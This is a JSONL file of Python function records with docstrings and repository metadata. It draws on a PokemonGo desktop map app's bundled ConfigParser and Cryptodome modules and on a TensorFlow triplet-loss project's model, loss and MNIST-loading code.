{"docstring": "\"\"\"Return a list of option names for the given section name.\"\"\"\n", "func_signal": "def options(self, section):\n", "code": "try:\n    opts = self._sections[section].copy()\nexcept KeyError:\n    raise NoSectionError(section)\nopts.update(self._defaults)\nif '__name__' in opts:\n    del opts['__name__']\nreturn opts.keys()", "path": "PokemonGo-DesktopMap/app/pywin/Lib/ConfigParser.py", "commit_date": "2016-08-21 00:00:00", "repo_name": "mchristopher/PokemonGo-DesktopMap", "stars": 1765, "license": "mit", "language": "python", "size": 34961}
{"docstring": "# do the string interpolation\n", "func_signal": "def _interpolate(self, section, option, rawval, vars):\n", "code": "L = []\nself._interpolate_some(option, L, rawval, section, vars, 1)\nreturn ''.join(L)", "path": "PokemonGo-DesktopMap/app/pywin/Lib/ConfigParser.py", "commit_date": "2016-08-21 00:00:00", "repo_name": "mchristopher/PokemonGo-DesktopMap", "stars": 1765, "license": "mit", "language": "python", "size": 34961}
{"docstring": "\"\"\"Remove a file section.\"\"\"\n", "func_signal": "def remove_section(self, section):\n", "code": "existed = section in self._sections\nif existed:\n    del self._sections[section]\nreturn existed", "path": "PokemonGo-DesktopMap/app/pywin/Lib/ConfigParser.py", "commit_date": "2016-08-21 00:00:00", "repo_name": "mchristopher/PokemonGo-DesktopMap", "stars": 1765, "license": "mit", "language": "python", "size": 34961}
{"docstring": "\"\"\"Instantiate a cipher object that performs ECB encryption/decryption.\n\n:Parameters:\n  factory : module\n    The underlying block cipher, a module from ``Cryptodome.Cipher``.\n\nAll keywords are passed to the underlying block cipher.\nSee the relevant documentation for details (at least ``key`` will need\nto be present\"\"\"\n\n", "func_signal": "def _create_ecb_cipher(factory, **kwargs):\n", "code": "cipher_state = factory._create_base_cipher(kwargs)\nif kwargs:\n    raise TypeError(\"Unknown parameters for ECB: %s\" % str(kwargs))\nreturn EcbMode(cipher_state)", "path": "PokemonGo-DesktopMap/app/pylibs/osx64/Cryptodome/Cipher/_mode_ecb.py", "commit_date": "2016-08-21 00:00:00", "repo_name": "mchristopher/PokemonGo-DesktopMap", "stars": 1765, "license": "mit", "language": "python", "size": 34961}
{"docstring": "\"\"\"Decrypt data with the key set at initialization.\n\nThe data to decrypt can be broken up in two or\nmore pieces and `decrypt` can be called multiple times.\n\nThat is, the statement:\n\n    >>> c.decrypt(a) + c.decrypt(b)\n\nis equivalent to:\n\n     >>> c.decrypt(a+b)\n\nThis function does not remove any padding from the plaintext.\n\n:Parameters:\n  ciphertext : byte string\n    The piece of data to decrypt.\n    The length must be multiple of the cipher block length.\n\n:Return:\n    the decrypted data (byte string).\n    It is as long as *ciphertext*.\n\"\"\"\n\n", "func_signal": "def decrypt(self, ciphertext):\n", "code": "expect_byte_string(ciphertext)\nplaintext = create_string_buffer(len(ciphertext))\nresult = raw_ecb_lib.ECB_decrypt(self._state.get(),\n                                 ciphertext,\n                                 plaintext,\n                                 c_size_t(len(ciphertext)))\nif result:\n    raise ValueError(\"Error %d while decrypting in ECB mode\" % result)\nreturn get_raw_buffer(plaintext)", "path": "PokemonGo-DesktopMap/app/pylibs/osx64/Cryptodome/Cipher/_mode_ecb.py", "commit_date": "2016-08-21 00:00:00", "repo_name": "mchristopher/PokemonGo-DesktopMap", "stars": 1765, "license": "mit", "language": "python", "size": 34961}
{"docstring": "\"\"\"Write an .ini-format representation of the configuration state.\"\"\"\n", "func_signal": "def write(self, fp):\n", "code": "if self._defaults:\n    fp.write(\"[%s]\\n\" % DEFAULTSECT)\n    for (key, value) in self._defaults.items():\n        fp.write(\"%s = %s\\n\" % (key, str(value).replace('\\n', '\\n\\t')))\n    fp.write(\"\\n\")\nfor section in self._sections:\n    fp.write(\"[%s]\\n\" % section)\n    for (key, value) in self._sections[section].items():\n        if key == \"__name__\":\n            continue\n        if (value is not None) or (self._optcre == self.OPTCRE):\n            key = \" = \".join((key, str(value).replace('\\n', '\\n\\t')))\n        fp.write(\"%s\\n\" % (key))\n    fp.write(\"\\n\")", "path": "PokemonGo-DesktopMap/app/pywin/Lib/ConfigParser.py", "commit_date": "2016-08-21 00:00:00", "repo_name": "mchristopher/PokemonGo-DesktopMap", "stars": 1765, "license": "mit", "language": "python", "size": 34961}
{"docstring": "\"\"\"Set an option.\"\"\"\n", "func_signal": "def set(self, section, option, value=None):\n", "code": "if not section or section == DEFAULTSECT:\n    sectdict = self._defaults\nelse:\n    try:\n        sectdict = self._sections[section]\n    except KeyError:\n        raise NoSectionError(section)\nsectdict[self.optionxform(option)] = value", "path": "PokemonGo-DesktopMap/app/pywin/Lib/ConfigParser.py", "commit_date": "2016-08-21 00:00:00", "repo_name": "mchristopher/PokemonGo-DesktopMap", "stars": 1765, "license": "mit", "language": "python", "size": 34961}
{"docstring": "\"\"\"\nInitialize a BLAKE2s hash object.\n\"\"\"\n\n#: The size of the resulting hash in bytes.\n", "func_signal": "def __init__(self, data, key, digest_bytes, update_after_digest):\n", "code": "self.digest_size = digest_bytes\n\nself._update_after_digest = update_after_digest\nself._digest_done = False\n\n# See https://tools.ietf.org/html/draft-saarinen-blake2-02\nif digest_bytes in (16, 20, 28, 32) and not key:\n    self.oid = \"1.3.6.1.4.1.1722.12.2.2.\" + str(digest_bytes)\n\nexpect_byte_string(key)\n\nstate = VoidPointer()\nresult = _raw_blake2s_lib.blake2s_init(state.address_of(),\n                                       key,\n                                       c_size_t(len(key)),\n                                       c_size_t(digest_bytes)\n                                       )\nif result:\n    raise ValueError(\"Error %d while instantiating BLAKE2s\" % result)\nself._state = SmartPointer(state.get(),\n                           _raw_blake2s_lib.blake2s_destroy)\nif data:\n    self.update(data)", "path": "PokemonGo-DesktopMap/app/pylibs/osx64/Cryptodome/Hash/BLAKE2s.py", "commit_date": "2016-08-21 00:00:00", "repo_name": "mchristopher/PokemonGo-DesktopMap", "stars": 1765, "license": "mit", "language": "python", "size": 34961}
{"docstring": "\"\"\"Create a new block cipher, configured in ECB mode.\n\n:Parameters:\n  block_cipher : C pointer\n    A smart pointer to the low-level block cipher instance.\n\"\"\"\n\n", "func_signal": "def __init__(self, block_cipher):\n", "code": "self._state = VoidPointer()\nresult = raw_ecb_lib.ECB_start_operation(block_cipher.get(),\n                                         self._state.address_of())\nif result:\n    raise ValueError(\"Error %d while instatiating the ECB mode\"\n                     % result)\n\n# Ensure that object disposal of this Python object will (eventually)\n# free the memory allocated by the raw library for the cipher\n# mode\nself._state = SmartPointer(self._state.get(),\n                           raw_ecb_lib.ECB_stop_operation)\n\n# Memory allocated for the underlying block cipher is now owned\n# by the cipher mode\nblock_cipher.release()", "path": "PokemonGo-DesktopMap/app/pylibs/osx64/Cryptodome/Cipher/_mode_ecb.py", "commit_date": "2016-08-21 00:00:00", "repo_name": "mchristopher/PokemonGo-DesktopMap", "stars": 1765, "license": "mit", "language": "python", "size": 34961}
{"docstring": "\"\"\"Internal; write a 32-bit int to a file in little-endian order.\"\"\"\n", "func_signal": "def wr_long(f, x):\n", "code": "f.write(chr( x        & 0xff))\nf.write(chr((x >> 8)  & 0xff))\nf.write(chr((x >> 16) & 0xff))\nf.write(chr((x >> 24) & 0xff))", "path": "PokemonGo-DesktopMap/app/pywin/Lib/py_compile.py", "commit_date": "2016-08-21 00:00:00", "repo_name": "mchristopher/PokemonGo-DesktopMap", "stars": 1765, "license": "mit", "language": "python", "size": 34961}
{"docstring": "\"\"\"Parse a sectioned setup file.\n\nThe sections in setup file contains a title line at the top,\nindicated by a name in square brackets (`[]'), plus key/value\noptions lines, indicated by `name: value' format lines.\nContinuations are represented by an embedded newline then\nleading whitespace.  Blank lines, lines beginning with a '#',\nand just about everything else are ignored.\n\"\"\"\n", "func_signal": "def _read(self, fp, fpname):\n", "code": "cursect = None                        # None, or a dictionary\noptname = None\nlineno = 0\ne = None                              # None, or an exception\nwhile True:\n    line = fp.readline()\n    if not line:\n        break\n    lineno = lineno + 1\n    # comment or blank line?\n    if line.strip() == '' or line[0] in '#;':\n        continue\n    if line.split(None, 1)[0].lower() == 'rem' and line[0] in \"rR\":\n        # no leading whitespace\n        continue\n    # continuation line?\n    if line[0].isspace() and cursect is not None and optname:\n        value = line.strip()\n        if value:\n            cursect[optname].append(value)\n    # a section header or option header?\n    else:\n        # is it a section header?\n        mo = self.SECTCRE.match(line)\n        if mo:\n            sectname = mo.group('header')\n            if sectname in self._sections:\n                cursect = self._sections[sectname]\n            elif sectname == DEFAULTSECT:\n                cursect = self._defaults\n            else:\n                cursect = self._dict()\n                cursect['__name__'] = sectname\n                self._sections[sectname] = cursect\n            # So sections can't start with a continuation line\n            optname = None\n        # no section header in the file?\n        elif cursect is None:\n            raise MissingSectionHeaderError(fpname, lineno, line)\n        # an option line?\n        else:\n            mo = self._optcre.match(line)\n            if mo:\n                optname, vi, optval = mo.group('option', 'vi', 'value')\n                optname = self.optionxform(optname.rstrip())\n                # This check is fine because the OPTCRE cannot\n                # match if it would set optval to None\n                if optval is not None:\n                    if vi in ('=', ':') and ';' in optval:\n                        # ';' is a comment delimiter only if it follows\n                        # a spacing character\n                        pos = optval.find(';')\n                        if pos != -1 and optval[pos-1].isspace():\n                            optval = optval[:pos]\n                    optval = optval.strip()\n                    # allow empty values\n                    if optval == '\"\"':\n                        optval = ''\n                    cursect[optname] = [optval]\n                else:\n                    # valueless option handling\n                    cursect[optname] = optval\n            else:\n                # a non-fatal parsing error occurred.  set up the\n                # exception but keep going. the exception will be\n                # raised at the end of the file and will contain a\n                # list of all bogus lines\n                if not e:\n                    e = ParsingError(fpname)\n                e.append(lineno, repr(line))\n# if any parsing errors occurred, raise an exception\nif e:\n    raise e\n\n# join the multi-line values collected while reading\nall_sections = [self._defaults]\nall_sections.extend(self._sections.values())\nfor options in all_sections:\n    for name, val in options.items():\n        if isinstance(val, list):\n            options[name] = '\\n'.join(val)", "path": "PokemonGo-DesktopMap/app/pywin/Lib/ConfigParser.py", "commit_date": "2016-08-21 00:00:00", "repo_name": "mchristopher/PokemonGo-DesktopMap", "stars": 1765, "license": "mit", "language": "python", "size": 34961}
{"docstring": "\"\"\"Remove an option.\"\"\"\n", "func_signal": "def remove_option(self, section, option):\n", "code": "if not section or section == DEFAULTSECT:\n    sectdict = self._defaults\nelse:\n    try:\n        sectdict = self._sections[section]\n    except KeyError:\n        raise NoSectionError(section)\noption = self.optionxform(option)\nexisted = option in sectdict\nif existed:\n    del sectdict[option]\nreturn existed", "path": "PokemonGo-DesktopMap/app/pywin/Lib/ConfigParser.py", "commit_date": "2016-08-21 00:00:00", "repo_name": "mchristopher/PokemonGo-DesktopMap", "stars": 1765, "license": "mit", "language": "python", "size": 34961}
{"docstring": "\"\"\"Return a list of tuples with (name, value) for each option\nin the section.\n\nAll % interpolations are expanded in the return values, based on the\ndefaults passed into the constructor, unless the optional argument\n`raw' is true.  Additional substitutions may be provided using the\n`vars' argument, which must be a dictionary whose contents overrides\nany pre-existing defaults.\n\nThe section DEFAULT is special.\n\"\"\"\n", "func_signal": "def items(self, section, raw=False, vars=None):\n", "code": "d = self._defaults.copy()\ntry:\n    d.update(self._sections[section])\nexcept KeyError:\n    if section != DEFAULTSECT:\n        raise NoSectionError(section)\n# Update with the entry specific variables\nif vars:\n    for key, value in vars.items():\n        d[self.optionxform(key)] = value\noptions = d.keys()\nif \"__name__\" in options:\n    options.remove(\"__name__\")\nif raw:\n    return [(option, d[option])\n            for option in options]\nelse:\n    return [(option, self._interpolate(section, option, d[option], d))\n            for option in options]", "path": "PokemonGo-DesktopMap/app/pywin/Lib/ConfigParser.py", "commit_date": "2016-08-21 00:00:00", "repo_name": "mchristopher/PokemonGo-DesktopMap", "stars": 1765, "license": "mit", "language": "python", "size": 34961}
{"docstring": "\"\"\"Return the **binary** (non-printable) digest of the message that\nhas been hashed so far.\n\nYou cannot update the hash anymore after the first call to ``digest``\n(or ``hexdigest``).\n\n:Return: A byte string of `digest_size` bytes. It may contain non-ASCII\n characters, including null bytes.\n\"\"\"\n\n", "func_signal": "def digest(self):\n", "code": "bfr = create_string_buffer(32)\nresult = _raw_blake2s_lib.blake2s_digest(self._state.get(),\n                                         bfr)\nif result:\n    raise ValueError(\"Error %d while creating BLAKE2s digest\" % result)\n\nself._digest_done = True\n\nreturn get_raw_buffer(bfr)[:self.digest_size]", "path": "PokemonGo-DesktopMap/app/pylibs/osx64/Cryptodome/Hash/BLAKE2s.py", "commit_date": "2016-08-21 00:00:00", "repo_name": "mchristopher/PokemonGo-DesktopMap", "stars": 1765, "license": "mit", "language": "python", "size": 34961}
{"docstring": "\"\"\"Verify that a given **binary** MAC (computed by another party)\nis valid.\n\n:Parameters:\n  mac_tag : byte string\n    The expected MAC of the message.\n:Raises ValueError:\n    if the MAC does not match. It means that the message\n    has been tampered with or that the MAC key is incorrect.\n\"\"\"\n\n", "func_signal": "def verify(self, mac_tag):\n", "code": "secret = get_random_bytes(16)\n\nmac1 = new(digest_bits=160, key=secret, data=mac_tag)\nmac2 = new(digest_bits=160, key=secret, data=self.digest())\n\nif mac1.digest() != mac2.digest():\n    raise ValueError(\"MAC check failed\")", "path": "PokemonGo-DesktopMap/app/pylibs/osx64/Cryptodome/Hash/BLAKE2s.py", "commit_date": "2016-08-21 00:00:00", "repo_name": "mchristopher/PokemonGo-DesktopMap", "stars": 1765, "license": "mit", "language": "python", "size": 34961}
{"docstring": "\"\"\"Sets the logger to log info in terminal and file `log_path`.\n\nIn general, it is useful to have a logger so that every output to the terminal is saved\nin a permanent file. Here we save it to `model_dir/train.log`.\n\nExample:\n```\nlogging.info(\"Starting training...\")\n```\n\nArgs:\n    log_path: (string) where to log\n\"\"\"\n", "func_signal": "def set_logger(log_path):\n", "code": "logger = logging.getLogger()\nlogger.setLevel(logging.INFO)\n\nif not logger.handlers:\n    # Logging to a file\n    file_handler = logging.FileHandler(log_path)\n    file_handler.setFormatter(logging.Formatter('%(asctime)s:%(levelname)s: %(message)s'))\n    logger.addHandler(file_handler)\n\n    # Logging to console\n    stream_handler = logging.StreamHandler()\n    stream_handler.setFormatter(logging.Formatter('%(message)s'))\n    logger.addHandler(stream_handler)", "path": "tensorflow-triplet-loss/model/utils.py", "commit_date": "2018-03-13 00:00:00", "repo_name": "omoindrot/tensorflow-triplet-loss", "stars": 1107, "license": "mit", "language": "python", "size": 3281}
{"docstring": "\"\"\"Saves dict of floats in json file\n\nArgs:\n    d: (dict) of float-castable values (np.float, int, float, etc.)\n    json_path: (string) path to json file\n\"\"\"\n", "func_signal": "def save_dict_to_json(d, json_path):\n", "code": "with open(json_path, 'w') as f:\n    # We need to convert the values to float for json (it doesn't accept np.array, np.float, )\n    d = {k: float(v) for k, v in d.items()}\n    json.dump(d, f, indent=4)", "path": "tensorflow-triplet-loss/model/utils.py", "commit_date": "2018-03-13 00:00:00", "repo_name": "omoindrot/tensorflow-triplet-loss", "stars": 1107, "license": "mit", "language": "python", "size": 3281}
{"docstring": "\"\"\"Read 4 bytes from bytestream as an unsigned 32-bit integer.\"\"\"\n", "func_signal": "def read32(bytestream):\n", "code": "dt = np.dtype(np.uint32).newbyteorder('>')\nreturn np.frombuffer(bytestream.read(4), dtype=dt)[0]", "path": "tensorflow-triplet-loss/model/mnist_dataset.py", "commit_date": "2018-04-02 00:00:00", "repo_name": "omoindrot/tensorflow-triplet-loss", "stars": 1107, "license": "mit", "language": "python", "size": 3281}
{"docstring": "\"\"\"Compute outputs of the model (embeddings for triplet loss).\n\nArgs:\n    is_training: (bool) whether we are training or not\n    images: (dict) contains the inputs of the graph (features)\n            this can be `tf.placeholder` or outputs of `tf.data`\n    params: (Params) hyperparameters\n\nReturns:\n    output: (tf.Tensor) output of the model\n\"\"\"\n", "func_signal": "def build_model(is_training, images, params):\n", "code": "out = images\n# Define the number of channels of each convolution\n# For each block, we do: 3x3 conv -> batch norm -> relu -> 2x2 maxpool\nnum_channels = params.num_channels\nbn_momentum = params.bn_momentum\nchannels = [num_channels, num_channels * 2]\nfor i, c in enumerate(channels):\n    with tf.variable_scope('block_{}'.format(i+1)):\n        out = tf.layers.conv2d(out, c, 3, padding='same')\n        if params.use_batch_norm:\n            out = tf.layers.batch_normalization(out, momentum=bn_momentum, training=is_training)\n        out = tf.nn.relu(out)\n        out = tf.layers.max_pooling2d(out, 2, 2)\n\nassert out.shape[1:] == [7, 7, num_channels * 2]\n\nout = tf.reshape(out, [-1, 7 * 7 * num_channels * 2])\nwith tf.variable_scope('fc_1'):\n    out = tf.layers.dense(out, params.embedding_size)\n\nreturn out", "path": "tensorflow-triplet-loss/model/model_fn.py", "commit_date": "2018-04-02 00:00:00", "repo_name": "omoindrot/tensorflow-triplet-loss", "stars": 1107, "license": "mit", "language": "python", "size": 3281}
{"docstring": "\"\"\"Download and parse MNIST dataset.\"\"\"\n\n", "func_signal": "def dataset(directory, images_file, labels_file):\n", "code": "images_file = download(directory, images_file)\nlabels_file = download(directory, labels_file)\n\ncheck_image_file_header(images_file)\ncheck_labels_file_header(labels_file)\n\ndef decode_image(image):\n    # Normalize from [0, 255] to [0.0, 1.0]\n    image = tf.decode_raw(image, tf.uint8)\n    image = tf.cast(image, tf.float32)\n    image = tf.reshape(image, [784])\n    return image / 255.0\n\ndef decode_label(label):\n    label = tf.decode_raw(label, tf.uint8)  # tf.string -> [tf.uint8]\n    label = tf.reshape(label, [])  # label is a scalar\n    return tf.to_int32(label)\n\nimages = tf.data.FixedLengthRecordDataset(images_file, 28 * 28, header_bytes=16)\nimages = images.map(decode_image)\nlabels = tf.data.FixedLengthRecordDataset(labels_file, 1, header_bytes=8).map(decode_label)\nreturn tf.data.Dataset.zip((images, labels))", "path": "tensorflow-triplet-loss/model/mnist_dataset.py", "commit_date": "2018-04-02 00:00:00", "repo_name": "omoindrot/tensorflow-triplet-loss", "stars": 1107, "license": "mit", "language": "python", "size": 3281}
{"docstring": "\"\"\"Model function for tf.estimator\n\nArgs:\n    features: input batch of images\n    labels: labels of the images\n    mode: can be one of tf.estimator.ModeKeys.{TRAIN, EVAL, PREDICT}\n    params: contains hyperparameters of the model (ex: `params.learning_rate`)\n\nReturns:\n    model_spec: tf.estimator.EstimatorSpec object\n\"\"\"\n", "func_signal": "def model_fn(features, labels, mode, params):\n", "code": "is_training = (mode == tf.estimator.ModeKeys.TRAIN)\n\nimages = features\nimages = tf.reshape(images, [-1, params.image_size, params.image_size, 1])\nassert images.shape[1:] == [params.image_size, params.image_size, 1], \"{}\".format(images.shape)\n\n# -----------------------------------------------------------\n# MODEL: define the layers of the model\nwith tf.variable_scope('model'):\n    # Compute the embeddings with the model\n    embeddings = build_model(is_training, images, params)\nembedding_mean_norm = tf.reduce_mean(tf.norm(embeddings, axis=1))\ntf.summary.scalar(\"embedding_mean_norm\", embedding_mean_norm)\n\nif mode == tf.estimator.ModeKeys.PREDICT:\n    predictions = {'embeddings': embeddings}\n    return tf.estimator.EstimatorSpec(mode=mode, predictions=predictions)\n\nlabels = tf.cast(labels, tf.int64)\n\n# Define triplet loss\nif params.triplet_strategy == \"batch_all\":\n    loss, fraction = batch_all_triplet_loss(labels, embeddings, margin=params.margin,\n                                            squared=params.squared)\nelif params.triplet_strategy == \"batch_hard\":\n    loss = batch_hard_triplet_loss(labels, embeddings, margin=params.margin,\n                                   squared=params.squared)\nelse:\n    raise ValueError(\"Triplet strategy not recognized: {}\".format(params.triplet_strategy))\n\n# -----------------------------------------------------------\n# METRICS AND SUMMARIES\n# Metrics for evaluation using tf.metrics (average over whole dataset)\n# TODO: some other metrics like rank-1 accuracy?\nwith tf.variable_scope(\"metrics\"):\n    eval_metric_ops = {\"embedding_mean_norm\": tf.metrics.mean(embedding_mean_norm)}\n\n    if params.triplet_strategy == \"batch_all\":\n        eval_metric_ops['fraction_positive_triplets'] = tf.metrics.mean(fraction)\n\nif mode == tf.estimator.ModeKeys.EVAL:\n    return tf.estimator.EstimatorSpec(mode, loss=loss, eval_metric_ops=eval_metric_ops)\n\n\n# Summaries for training\ntf.summary.scalar('loss', loss)\nif params.triplet_strategy == \"batch_all\":\n    tf.summary.scalar('fraction_positive_triplets', fraction)\n\ntf.summary.image('train_image', images, max_outputs=1)\n\n# Define training step that minimizes the loss with the Adam optimizer\noptimizer = tf.train.AdamOptimizer(params.learning_rate)\nglobal_step = tf.train.get_global_step()\nif params.use_batch_norm:\n    # Add a dependency to update the moving mean and variance for batch normalization\n    with tf.control_dependencies(tf.get_collection(tf.GraphKeys.UPDATE_OPS)):\n        train_op = optimizer.minimize(loss, global_step=global_step)\nelse:\n    train_op = optimizer.minimize(loss, global_step=global_step)\n\nreturn tf.estimator.EstimatorSpec(mode, loss=loss, train_op=train_op)", "path": "tensorflow-triplet-loss/model/model_fn.py", "commit_date": "2018-04-02 00:00:00", "repo_name": "omoindrot/tensorflow-triplet-loss", "stars": 1107, "license": "mit", "language": "python", "size": 3281}
{"docstring": "\"\"\"Validate that filename corresponds to labels for the MNIST dataset.\"\"\"\n", "func_signal": "def check_labels_file_header(filename):\n", "code": "with tf.gfile.Open(filename, 'rb') as f:\n    magic = read32(f)\n    read32(f)  # num_items, unused\n    if magic != 2049:\n        raise ValueError('Invalid magic number %d in MNIST file %s' % (magic, f.name))", "path": "tensorflow-triplet-loss/model/mnist_dataset.py", "commit_date": "2018-04-02 00:00:00", "repo_name": "omoindrot/tensorflow-triplet-loss", "stars": 1107, "license": "mit", "language": "python", "size": 3281}
{"docstring": "\"\"\"Download (and unzip) a file from the MNIST dataset if not already done.\"\"\"\n", "func_signal": "def download(directory, filename):\n", "code": "filepath = os.path.join(directory, filename)\nif tf.gfile.Exists(filepath):\n    return filepath\nif not tf.gfile.Exists(directory):\n    tf.gfile.MakeDirs(directory)\n# CVDF mirror of http://yann.lecun.com/exdb/mnist/\nurl = 'https://storage.googleapis.com/cvdf-datasets/mnist/' + filename + '.gz'\nzipped_filepath = filepath + '.gz'\nprint('Downloading %s to %s' % (url, zipped_filepath))\nurllib.request.urlretrieve(url, zipped_filepath)\nwith gzip.open(zipped_filepath, 'rb') as f_in, open(filepath, 'wb') as f_out:\n    shutil.copyfileobj(f_in, f_out)\nos.remove(zipped_filepath)\nreturn filepath", "path": "tensorflow-triplet-loss/model/mnist_dataset.py", "commit_date": "2018-04-02 00:00:00", "repo_name": "omoindrot/tensorflow-triplet-loss", "stars": 1107, "license": "mit", "language": "python", "size": 3281}
{"docstring": "\"\"\"Launch training of the model with a set of hyperparameters in parent_dir/job_name\n\nArgs:\n    parent_dir: (string) directory containing config, weights and log\n    data_dir: (string) directory containing the dataset\n    params: (dict) containing hyperparameters\n\"\"\"\n# Create a new folder in parent_dir with unique_name \"job_name\"\n", "func_signal": "def launch_training_job(parent_dir, data_dir, job_name, params):\n", "code": "model_dir = os.path.join(parent_dir, job_name)\nif not os.path.exists(model_dir):\n    os.makedirs(model_dir)\n\n# Write parameters in json file\njson_path = os.path.join(model_dir, 'params.json')\nparams.save(json_path)\n\n# Launch training with this config\ncmd = \"{python} train.py --model_dir {model_dir} --data_dir {data_dir}\"\ncmd = cmd.format(python=PYTHON, model_dir=model_dir, data_dir=data_dir)\nprint(cmd)\ncheck_call(cmd, shell=True)", "path": "tensorflow-triplet-loss/search_hyperparams.py", "commit_date": "2018-04-29 00:00:00", "repo_name": "omoindrot/tensorflow-triplet-loss", "stars": 1107, "license": "mit", "language": "python", "size": 3281}
{"docstring": "\"\"\"tf.data.Dataset object for MNIST training data.\"\"\"\n", "func_signal": "def train(directory):\n", "code": "return dataset(directory, 'train-images-idx3-ubyte',\n               'train-labels-idx1-ubyte')", "path": "tensorflow-triplet-loss/model/mnist_dataset.py", "commit_date": "2018-04-02 00:00:00", "repo_name": "omoindrot/tensorflow-triplet-loss", "stars": 1107, "license": "mit", "language": "python", "size": 3281}
{"docstring": "\"\"\"Test input function for the MNIST dataset.\n\nArgs:\n    data_dir: (string) path to the data directory\n    params: (Params) contains hyperparameters of the model (ex: `params.num_epochs`)\n\"\"\"\n", "func_signal": "def test_input_fn(data_dir, params):\n", "code": "dataset = mnist_dataset.test(data_dir)\ndataset = dataset.batch(params.batch_size)\ndataset = dataset.prefetch(1)  # make sure you always have one batch ready to serve\nreturn dataset", "path": "tensorflow-triplet-loss/model/input_fn.py", "commit_date": "2018-04-02 00:00:00", "repo_name": "omoindrot/tensorflow-triplet-loss", "stars": 1107, "license": "mit", "language": "python", "size": 3281}
{"docstring": "\"\"\"Saves parameters to json file\"\"\"\n", "func_signal": "def save(self, json_path):\n", "code": "with open(json_path, 'w') as f:\n    json.dump(self.__dict__, f, indent=4)", "path": "tensorflow-triplet-loss/model/utils.py", "commit_date": "2018-03-13 00:00:00", "repo_name": "omoindrot/tensorflow-triplet-loss", "stars": 1107, "license": "mit", "language": "python", "size": 3281}
{"docstring": "\"\"\"Return a 2D mask where mask[a, n] is True iff a and n have distinct labels.\n\nArgs:\n    labels: tf.int32 `Tensor` with shape [batch_size]\n\nReturns:\n    mask: tf.bool `Tensor` with shape [batch_size, batch_size]\n\"\"\"\n# Check if labels[i] != labels[k]\n# Uses broadcasting where the 1st argument has shape (1, batch_size) and the 2nd (batch_size, 1)\n", "func_signal": "def _get_anchor_negative_triplet_mask(labels):\n", "code": "labels_equal = tf.equal(tf.expand_dims(labels, 0), tf.expand_dims(labels, 1))\n\nmask = tf.logical_not(labels_equal)\n\nreturn mask", "path": "tensorflow-triplet-loss/model/triplet_loss.py", "commit_date": "2018-07-05 00:00:00", "repo_name": "omoindrot/tensorflow-triplet-loss", "stars": 1107, "license": "mit", "language": "python", "size": 3281}
{"docstring": "\"\"\"Train input function for the MNIST dataset.\n\nArgs:\n    data_dir: (string) path to the data directory\n    params: (Params) contains hyperparameters of the model (ex: `params.num_epochs`)\n\"\"\"\n", "func_signal": "def train_input_fn(data_dir, params):\n", "code": "dataset = mnist_dataset.train(data_dir)\ndataset = dataset.shuffle(params.train_size)  # whole dataset into the buffer\ndataset = dataset.repeat(params.num_epochs)  # repeat for multiple epochs\ndataset = dataset.batch(params.batch_size)\ndataset = dataset.prefetch(1)  # make sure you always have one batch ready to serve\nreturn dataset", "path": "tensorflow-triplet-loss/model/input_fn.py", "commit_date": "2018-04-02 00:00:00", "repo_name": "omoindrot/tensorflow-triplet-loss", "stars": 1107, "license": "mit", "language": "python", "size": 3281}
{"docstring": "\"\"\"Loads parameters from json file\"\"\"\n", "func_signal": "def update(self, json_path):\n", "code": "with open(json_path) as f:\n    params = json.load(f)\n    self.__dict__.update(params)", "path": "tensorflow-triplet-loss/model/utils.py", "commit_date": "2018-03-13 00:00:00", "repo_name": "omoindrot/tensorflow-triplet-loss", "stars": 1107, "license": "mit", "language": "python", "size": 3281}
{"docstring": "\"\"\"Build the triplet loss over a batch of embeddings.\n\nWe generate all the valid triplets and average the loss over the positive ones.\n\nArgs:\n    labels: labels of the batch, of size (batch_size,)\n    embeddings: tensor of shape (batch_size, embed_dim)\n    margin: margin for triplet loss\n    squared: Boolean. If true, output is the pairwise squared euclidean distance matrix.\n             If false, output is the pairwise euclidean distance matrix.\n\nReturns:\n    triplet_loss: scalar tensor containing the triplet loss\n\"\"\"\n# Get the pairwise distance matrix\n", "func_signal": "def batch_all_triplet_loss(labels, embeddings, margin, squared=False):\n", "code": "pairwise_dist = _pairwise_distances(embeddings, squared=squared)\n\n# shape (batch_size, batch_size, 1)\nanchor_positive_dist = tf.expand_dims(pairwise_dist, 2)\nassert anchor_positive_dist.shape[2] == 1, \"{}\".format(anchor_positive_dist.shape)\n# shape (batch_size, 1, batch_size)\nanchor_negative_dist = tf.expand_dims(pairwise_dist, 1)\nassert anchor_negative_dist.shape[1] == 1, \"{}\".format(anchor_negative_dist.shape)\n\n# Compute a 3D tensor of size (batch_size, batch_size, batch_size)\n# triplet_loss[i, j, k] will contain the triplet loss of anchor=i, positive=j, negative=k\n# Uses broadcasting where the 1st argument has shape (batch_size, batch_size, 1)\n# and the 2nd (batch_size, 1, batch_size)\ntriplet_loss = anchor_positive_dist - anchor_negative_dist + margin\n\n# Put to zero the invalid triplets\n# (where label(a) != label(p) or label(n) == label(a) or a == p)\nmask = _get_triplet_mask(labels)\nmask = tf.to_float(mask)\ntriplet_loss = tf.multiply(mask, triplet_loss)\n\n# Remove negative losses (i.e. the easy triplets)\ntriplet_loss = tf.maximum(triplet_loss, 0.0)\n\n# Count number of positive triplets (where triplet_loss > 0)\nvalid_triplets = tf.to_float(tf.greater(triplet_loss, 1e-16))\nnum_positive_triplets = tf.reduce_sum(valid_triplets)\nnum_valid_triplets = tf.reduce_sum(mask)\nfraction_positive_triplets = num_positive_triplets / (num_valid_triplets + 1e-16)\n\n# Get final mean triplet loss over the positive valid triplets\ntriplet_loss = tf.reduce_sum(triplet_loss) / (num_positive_triplets + 1e-16)\n\nreturn triplet_loss, fraction_positive_triplets", "path": "tensorflow-triplet-loss/model/triplet_loss.py", "commit_date": "2018-07-05 00:00:00", "repo_name": "omoindrot/tensorflow-triplet-loss", "stars": 1107, "license": "mit", "language": "python", "size": 3281}
